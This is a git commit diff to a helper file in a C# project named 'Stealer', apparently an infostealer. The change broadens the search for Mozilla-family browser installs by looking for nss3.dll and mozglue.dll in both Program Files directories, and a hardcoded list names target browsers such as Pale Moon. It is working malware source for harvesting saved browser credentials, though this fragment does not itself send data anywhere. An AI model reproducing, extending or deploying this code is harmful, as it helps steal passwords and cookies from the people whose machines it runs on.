ea8ab675efd7e92b858f5c1829926125c723f545
Ghost <vladimirvsevolodovi@yandex.ru>
2020-09-17 00:58:54 +0300

    fix #1

--- Stealer/Modules/Helpers/Profile.cs
+++ Stealer/Modules/Helpers/Profile.cs
@@ -23,16 +23,28 @@ namespace Stealer.Helpers
 			"NETGATE Technologies\\BlackHaw",
 			"Moonchild Productions\\Pale Moon"
 		};
-		
-		// Get program files path
-		private static string ProgramFiles()
+
+		private static string[] Concat(string[] x, string[] y)
 		{
+			if (x == null) throw new ArgumentNullException("x");
+			if (y == null) throw new ArgumentNullException("y");
+			int oldLen = x.Length;
+			Array.Resize(ref x, x.Length + y.Length);
+			Array.Copy(y, 0, x, oldLen, y.Length);
+			return x;
+		}
+
+		// Get program files path
+		private static string[] ProgramFilesChildren()
+		{
+			string[] children = Directory.GetDirectories(Environment.GetEnvironmentVariable("ProgramFiles"));
+
 			if (8 == IntPtr.Size || (!String.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"))))
 			{
-				return Environment.GetEnvironmentVariable("ProgramFiles(x86)");
+				children = Concat(children, Directory.GetDirectories(Environment.GetEnvironmentVariable("ProgramFiles(x86)")));
 			}
 
-			return Environment.GetEnvironmentVariable("ProgramFiles");
+			return children;
 		}
 
 		// Get profile directory location
@@ -55,7 +67,7 @@ namespace Stealer.Helpers
 		// Get directory with nss3.dll
 		public static string GetMozillaPath()
 		{
-			foreach (string sDir in Directory.GetDirectories(ProgramFiles()))
+			foreach (string sDir in ProgramFilesChildren())
 			{
 				if (File.Exists(sDir + "\\nss3.dll") &&
 					File.Exists(sDir + "\\mozglue.dll"))
